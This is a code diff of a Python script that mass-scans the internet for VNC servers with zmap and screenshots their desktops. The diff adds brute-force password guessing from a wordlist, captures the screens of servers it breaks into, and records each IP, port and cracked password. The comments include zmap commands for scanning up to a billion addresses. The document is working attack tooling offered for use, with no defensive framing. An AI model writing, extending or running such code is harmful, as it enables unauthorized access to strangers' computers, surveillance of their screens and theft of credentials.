@@ -7,12 +7,11 @@ import time
 from io import StringIO
 from vncdotool import api
 
-#install vncdotool and zmap
+#install vncdotool, but don't need to import. Also install zmap
 
 #sudo zmap -B 10M -p 5900 -n 500000 -o results.txt
 #sudo zmap -B 10M -p 5900 -n 1000000000 -o results.txt    2.5 days/60 hours
 #sudo zmap -B 10M -p 5900 -n 16666666 -o results.txt    1 hour
-
 
 vncport = "5900"
 #Timeout in seconds
@@ -23,11 +22,17 @@ process_amount = 50
 #replaces the backslashes in os.getcwd with forward slashes.
 screenshot_path = os.getcwd().replace('\\', '/') + "/results/screenshots/"
 
-ipfile = "./results.txt"
+password_file = "./passwords.txt"
+ipfile = "./pw_results.txt"
 valid_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_validips.txt"
 password_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_passwordips.txt"
 
-#If vnc has password, try easy pws like "123"
+password_check = True
+
+if password_check:
+    #Passwords to test every password-protected VNC server by, line-separated.
+    passwords =[line.strip() for line in open(password_file)]
+
 
 def screencapture(startendpts):
     #startendpts in format: [start:end] eg: [0,52] [53, 106]...
@@ -61,9 +66,41 @@ def screencapture(startendpts):
                 None
                 #print("Connection to IP " + str(i) + "/" + str(end) + " has timed out.")
             elif "password" in str(e):
-                print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has failed because it requires a password.")
-                password_failed_amt += 1
-                password_failed_ips.append(vncserver)
+                password_success = False
+                correctpass = None
+                if password_check:
+                    for pw in passwords:
+                        try:
+                            client = api.connect(vncserver, password=pw)
+                            client.timeout = connection_timeout
+                            client.connectionMade()
+                            client.disconnect()     
+                        except:
+                            pass
+                        else:
+                            correctpass = pw
+                            password_success = True
+                            break
+                if password_success:
+                    print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has passed because it has a password present in your password list: " + correctpass)
+                    try:
+                        client = api.connect(vncserver, password=correctpass)
+                        client.timeout = screenshot_timeout
+                        client.captureScreen(screenshot_path + screenshot_filename)
+                        client.disconnect()            
+                    except Exception as e:
+                        print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") password was found, but screenshot could not be taken. Exception: " + str(e))
+                    else:
+                        screenshot_endtime = datetime.now()
+                        screenshot_duration = screenshot_endtime - screenshot_starttime
+                        print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
+                        passed_amt += 1  
+                        passed_ips.append(vncserver + ":" + vncport + ":" + correctpass)                         
+                    
+                else:
+                    print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has failed because it requires a password you do not have.")
+                    password_failed_amt += 1
+                    password_failed_ips.append(vncserver + ":" + vncport)
             else:
                 None
                 print("Screencapture for IP " + str(i) + "/" + str(end) + " has failed: " + str(e))
@@ -73,7 +110,7 @@ def screencapture(startendpts):
             screenshot_duration = screenshot_endtime - screenshot_starttime
             print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
             passed_amt += 1  
-            passed_ips.append(vncserver) 
+            passed_ips.append(vncserver + ":" + vncport)
     
     resultsdict = {}
     resultsdict['passed_ips'] = passed_ips
@@ -128,7 +165,7 @@ if __name__ == '__main__':
             passed_ips.append(ip)
         
              
-#Will not go further until all of the multiprocesses have finished.
+#Will not go further until all of the process_amount have finished.
 print("Screencaptures have finished. Passed: " + str(passed_amt) + ". Password failed: " + str(password_failed_amt) + ". Failed: " + str(failed_amt) + ".")
 print("Writing passed IPs to file.")
 with open(valid_ipfile, "w") as myfile:
@@ -139,5 +176,6 @@ print("Writing password-failed IPs to file.")
 with open(password_ipfile, "w") as myfile:
     for ip in password_failed_ips:
         ip += "\n"
-        myfile.write(ip)    
+        myfile.write(ip)  
+        
 print("Password-failed IPs have been written to " + password_ipfile)
